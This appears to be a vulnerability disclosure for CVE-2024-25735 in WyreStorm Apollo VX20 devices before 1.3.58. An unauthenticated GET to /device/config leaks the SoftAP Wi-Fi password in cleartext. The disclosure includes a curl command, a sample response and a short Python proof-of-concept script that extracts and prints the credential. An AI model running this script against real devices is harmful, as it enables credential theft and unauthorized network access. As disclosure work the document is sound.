[CVE Reference]
CVE-2024-25735


[Security Issue]
An issue was discovered on WyreStorm Apollo VX20 devices before 1.3.58.
Remote attackers can discover cleartext credentials for the SoftAP (access point) Router /device/config using an HTTP GET request.
The credentials are then returned in the HTTP response. curl -k https://192.168.x.x/device/config

E.g. HTTP response snippet:

:{"enable":"y","oncmd":"8004","offcmd":"8036"}},"screen":"dual","ipconflict":"y","wifi":{"auto":"y","band":"5","channel":"153"}
,"softAp":{"password":"12345678","router":"y","softAp":"y"}...


[Exploit/POC]
import requests

target="https://x.x.x.x"
res = requests.get(target+"/device/config", verify=False)

idx=res.content.find('{"password":')
if idx != -1:
    idx2=res.content.find('router')
    if idx2 != -1:
        print("[+] CVE-2024-25735 Credentials Disclosure")
        print("[+] " + res.content[idx + 1:idx2 + 11])
